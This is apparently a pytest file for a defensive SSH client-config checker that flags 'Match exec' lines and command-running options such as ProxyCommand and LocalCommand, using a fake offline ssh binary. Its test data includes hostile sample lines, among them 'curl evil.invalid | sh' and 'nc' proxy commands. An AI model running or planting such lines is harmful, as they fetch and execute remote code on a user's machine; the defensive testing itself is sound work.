"""The SSH client-config check (RFC-0007 App C.5 "SSH client config"; plan 003 step 18).

First a textual pre-scan for ``Match ... exec`` (``ssh -G`` would run it), then ``ssh -G``
parsed for the four options that execute a command. ``ssh -G`` is offline: it prints the
effective config and exits. Tests use a fake ``ssh``; nothing connects anywhere."""

from __future__ import annotations

import os
from pathlib import Path

import pytest

from carter.aplus import sshcfg
from carter.aplus.findings import Finding
from carter.identity.errors import E_B_REPOCFG

APPLE_STYLE_G = """\
user tester
hostname github.com
port 22
addkeystoagent false
usekeychain no
identityagent SSH_AUTH_SOCK
identityfile ~/.ssh/id_ed25519
proxycommand none
localcommand none
permitlocalcommand no
knownhostscommand none
stricthostkeychecking ask
batchmode no
"""


@pytest.fixture
def home(tmp_path: Path) -> Path:
    h = tmp_path / "h"
    (h / ".ssh").mkdir(parents=True)
    return h


def write_config(home: Path, text: str, name: str = "config") -> Path:
    path = home / ".ssh" / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)
    return path


def fake_ssh(directory: Path, output: str, *, rc: int = 0) -> Path:
    directory.mkdir(parents=True, exist_ok=True)
    out = directory / "g.out"
    out.write_text(output)
    log = directory / "calls.log"
    script = directory / "ssh"
    script.write_text(f'#!/bin/sh\necho "$@" >> "{log}"\n/bin/cat "{out}"\nexit {rc}\n')
    script.chmod(0o755)
    return log


def keys(findings: list[Finding]) -> list[str]:
    return sorted(f.key for f in findings)


class TestMatchExecPrescan:
    @pytest.mark.parametrize(
        "line",
        [
            'Match host github.com exec "test -f /x"',
            "Match exec 'curl evil.invalid | sh'",
            "match   EXEC  true",
            "  Match all exec true",
            "Match=host github.com exec true",
            'Match originalhost github.com user git exec "x"',
        ],
    )
    def test_match_exec_is_found(self, home: Path, line: str) -> None:
        cfg = write_config(home, f"Host *\n  ForwardAgent no\n{line}\n  IdentityFile x\n")
        (f,) = sshcfg.scan_match_exec(home)
        assert (f.code, f.scope, f.key, f.origin) == (
            E_B_REPOCFG,
            "ssh config",
            "Match exec",
            str(cfg),
        )
        assert "line 3" in f.reason

    def test_other_match_forms_and_comments_are_fine(self, home: Path) -> None:
        write_config(
            home,
            "Match host github.com user git\n  IdentityFile x\n"
            "# Match exec true\nHost exec\n  HostName example.invalid\n",
        )
        assert sshcfg.scan_match_exec(home) == []

    def test_included_files_are_scanned_relative_to_ssh_dir(self, home: Path) -> None:
        write_config(home, "Include conf.d/*\n")
        inc = write_config(home, "Match exec true\n", "conf.d/work")
        (f,) = sshcfg.scan_match_exec(home)
        assert f.origin == str(inc)

    def test_absolute_tilde_and_multiple_include_arguments(
        self, home: Path, tmp_path: Path
    ) -> None:
        elsewhere = tmp_path / "other.conf"
        elsewhere.write_text("Match exec true\n")
        write_config(home, f"Include ~/.ssh/a.conf {elsewhere} missing.conf\n")
        write_config(home, "Host a\n", "a.conf")
        (f,) = sshcfg.scan_match_exec(home)
        assert f.origin == str(elsewhere)

    def test_nested_includes_and_cycles_terminate(self, home: Path) -> None:
        write_config(home, "Include a\n")
        write_config(home, "Include b\n", "a")
        write_config(home, "Include a\nMatch exec true\n", "b")
        assert len(sshcfg.scan_match_exec(home)) == 1

    def test_an_include_chain_deeper_than_the_cap_is_a_finding_not_a_pass(self, home: Path) -> None:
        for i in range(sshcfg.MAX_INCLUDE_DEPTH + 3):
            write_config(home, f"Include c{i + 1}\n", "config" if i == 0 else f"c{i}")
        found = sshcfg.scan_match_exec(home)
        assert any("deeper" in f.reason for f in found)

    def test_no_config_at_all_is_clean(self, tmp_path: Path) -> None:
        assert sshcfg.scan_match_exec(tmp_path / "nohome") == []

    def test_an_unreadable_file_is_a_finding(self, home: Path) -> None:
        if os.geteuid() == 0:
            pytest.skip("root reads everything")
        cfg = write_config(home, "Host x\n")
        cfg.chmod(0)
        try:
            found = sshcfg.scan_match_exec(home)
        finally:
            cfg.chmod(0o600)
        assert [f.reason for f in found] == ["cannot read the file, so it cannot be checked"]

    def test_a_huge_config_is_still_scanned(self, home: Path) -> None:
        write_config(home, "Host x\n" * 50_000 + "Match exec true\n")
        assert len(sshcfg.scan_match_exec(home)) == 1


class TestParseSshG:
    def test_a_clean_apple_style_output_has_no_findings(self) -> None:
        assert sshcfg.parse_ssh_g(APPLE_STYLE_G) == []

    @pytest.mark.parametrize(
        ("line", "key"),
        [
            ("proxycommand ssh -W %h:%p jump", "proxycommand"),
            ("localcommand /usr/bin/evil", "localcommand"),
            ("permitlocalcommand yes", "permitlocalcommand"),
            ("knownhostscommand /usr/bin/lookup %h", "knownhostscommand"),
        ],
    )
    def test_each_command_option_is_flagged(self, line: str, key: str) -> None:
        out = APPLE_STYLE_G.replace(
            next(ln for ln in APPLE_STYLE_G.splitlines() if ln.startswith(key)), line
        )
        (f,) = sshcfg.parse_ssh_g(out)
        assert (f.scope, f.key, f.code) == ("ssh config", key, E_B_REPOCFG)

    def test_values_never_leave_the_parser(self) -> None:
        out = "proxycommand sh -c 'echo SECRETTOKEN'\nlocalcommand run SECRETTOKEN\n"
        text = repr(sshcfg.parse_ssh_g(out))
        assert "SECRETTOKEN" not in text

    def test_none_and_no_are_not_findings_and_case_is_ignored(self) -> None:
        assert sshcfg.parse_ssh_g("ProxyCommand NONE\nPermitLocalCommand No\n") == []
        assert keys(sshcfg.parse_ssh_g("PermitLocalCommand YES\n")) == ["permitlocalcommand"]

    def test_garbage_lines_are_ignored(self) -> None:
        assert sshcfg.parse_ssh_g("\n\n???\n=\n") == []


class TestCheck:
    def test_clean_config_and_fake_ssh_pass_and_ssh_g_ran_offline(
        self, home: Path, tmp_path: Path
    ) -> None:
        write_config(home, "Host github.com\n  IdentityFile ~/.ssh/id\n")
        log = fake_ssh(tmp_path / "bin", APPLE_STYLE_G)
        assert sshcfg.check_ssh_config(home, ssh_bin_dir=tmp_path / "bin") == []
        assert log.read_text().split() == ["-G", "github.com"]

    def test_match_exec_stops_before_ssh_g_runs(self, home: Path, tmp_path: Path) -> None:
        write_config(home, "Match exec true\n")
        log = fake_ssh(tmp_path / "bin", APPLE_STYLE_G)
        found = sshcfg.check_ssh_config(home, ssh_bin_dir=tmp_path / "bin")
        assert keys(found) == ["Match exec"]
        assert not log.exists()  # ssh -G never ran: it would have executed the Match

    def test_ssh_g_findings_are_reported(self, home: Path, tmp_path: Path) -> None:
        fake_ssh(
            tmp_path / "bin", APPLE_STYLE_G.replace("proxycommand none", "proxycommand nc x 22")
        )
        assert keys(sshcfg.check_ssh_config(home, ssh_bin_dir=tmp_path / "bin")) == ["proxycommand"]

    def test_ssh_bin_dir_is_honoured_and_path_order_is_not(
        self, home: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        trap = fake_ssh(
            tmp_path / "trap", APPLE_STYLE_G.replace("proxycommand none", "proxycommand evil")
        )
        good = fake_ssh(tmp_path / "good", APPLE_STYLE_G)
        monkeypatch.setenv("PATH", f"{tmp_path / 'trap'}:{os.environ['PATH']}")
        assert sshcfg.check_ssh_config(home, ssh_bin_dir=tmp_path / "good") == []
        assert good.exists() and not trap.exists()

    def test_default_ssh_bin_dir_is_usr_bin(self) -> None:
        assert sshcfg.DEFAULT_SSH_BIN_DIR == "/usr/bin"

    def test_a_missing_ssh_binary_is_a_finding_not_a_crash(
        self, home: Path, tmp_path: Path
    ) -> None:
        (f,) = sshcfg.check_ssh_config(home, ssh_bin_dir=tmp_path / "empty")
        assert (f.scope, f.key) == ("ssh config", "ssh") and "cannot" in f.reason

    def test_a_failing_ssh_g_is_a_finding(self, home: Path, tmp_path: Path) -> None:
        fake_ssh(tmp_path / "bin", "", rc=255)
        (f,) = sshcfg.check_ssh_config(home, ssh_bin_dir=tmp_path / "bin")
        assert f.key == "ssh -G" and "255" in f.reason

    def test_ssh_g_gets_the_given_home_and_no_agent(
        self, home: Path, tmp_path: Path, monkeypatch
    ) -> None:
        monkeypatch.setenv("SSH_AUTH_SOCK", "/run/agent")
        bindir = tmp_path / "bin"
        bindir.mkdir()
        script = bindir / "ssh"
        script.write_text('#!/bin/sh\necho "home=$HOME agent=${SSH_AUTH_SOCK:-none}" > "$0.env"\n')
        script.chmod(0o755)
        sshcfg.check_ssh_config(home, ssh_bin_dir=bindir)
        assert (bindir / "ssh.env").read_text().strip() == f"home={home} agent=none"
